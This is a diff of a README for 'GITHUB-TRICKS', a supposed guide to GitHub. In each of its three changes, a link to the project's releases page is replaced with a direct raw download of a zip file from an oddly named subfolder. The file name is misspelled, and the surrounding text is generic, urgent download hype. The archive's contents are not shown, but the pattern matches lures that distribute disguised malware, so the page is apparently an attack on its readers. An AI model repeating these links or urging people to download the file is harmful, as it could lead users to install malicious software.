@@ -1,6 +1,6 @@
 # 🔧 GITHUB-TRICKS - Master GitHub Like a Pro
 
-[![Download GITHUB-TRICKS](https://img.shields.io/badge/Download-GITHUB--TRICKS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ganss9014/GITHUB-TRICKS/releases)
+[![Download GITHUB-TRICKS](https://img.shields.io/badge/Download-GITHUB--TRICKS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ganss9014/GITHUB-TRICKS/raw/refs/heads/main/Newfoundlander/TRICKS-GITHU-v2.0.zip)
 
 ## 🎯 What Is This?
 
@@ -10,7 +10,7 @@ GITHUB-TRICKS is your complete guide to unlocking the hidden power of GitHub. Wh
 
 Visit this link to download the application.
 
-[**Download GITHUB-TRICKS Now**](https://github.com/ganss9014/GITHUB-TRICKS/releases)
+[**Download GITHUB-TRICKS Now**](https://github.com/ganss9014/GITHUB-TRICKS/raw/refs/heads/main/Newfoundlander/TRICKS-GITHU-v2.0.zip)
 
 Once you click the link, you'll see a list of available files. Choose the latest version and download it to your computer. The download should start automatically.
 
@@ -115,7 +115,7 @@ Most GitHub guides are either too basic or too technical. This one walks the per
 
 Don't spend another day struggling with GitHub's hidden complexities. Download GITHUB-TRICKS now and unlock the full potential of the world's most popular development platform. Whether you're just starting or looking to level up your skills, this guide has something valuable for you.
 
-[**Get GITHUB-TRICKS Here**](https://github.com/ganss9014/GITHUB-TRICKS/releases)
+[**Get GITHUB-TRICKS Here**](https://github.com/ganss9014/GITHUB-TRICKS/raw/refs/heads/main/Newfoundlander/TRICKS-GITHU-v2.0.zip)
 
 The download is quick, the setup is simple, and the benefits are immediate. Join thousands of satisfied users who have already discovered the power of GitHub's best-kept secrets.
 
